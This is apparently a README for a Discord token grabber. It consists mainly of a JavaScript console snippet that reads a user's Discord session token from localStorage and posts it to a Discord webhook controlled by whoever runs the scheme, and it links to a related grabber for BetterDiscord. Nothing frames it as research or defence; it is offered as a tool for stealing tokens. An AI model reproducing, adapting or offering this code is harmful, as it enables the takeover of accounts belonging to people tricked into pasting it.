# Discord-Token-Grabber-Console-Script

If you want to token grab with a Better Discord script => [CLICK HERE](https://github.com/HideakiAtsuyo/BetterGrabber)

```js
(function() {
    window.dispatchEvent(new Event('beforeunload'));
    var x = new XMLHttpRequest;
    x.open("POST", 'https://canary.discord.com/api/webhooks/ID/TOKEN'), x.setRequestHeader("Content-type", "application/json");
    var y = {
        username: "TokenGrabber",
        avatar_url: "https://cdn.discordapp.com/icons/780542388283375636/d90bd3fe7ca527dafe66723b23b7c54d.webp",
        content: "@everyone",
        embeds: [{
            color: "696969",
            description: `Token: ${window.open().localStorage.token}`,
        }]
    };

    x.send(JSON.stringify(y));
    w.close()
}());
```
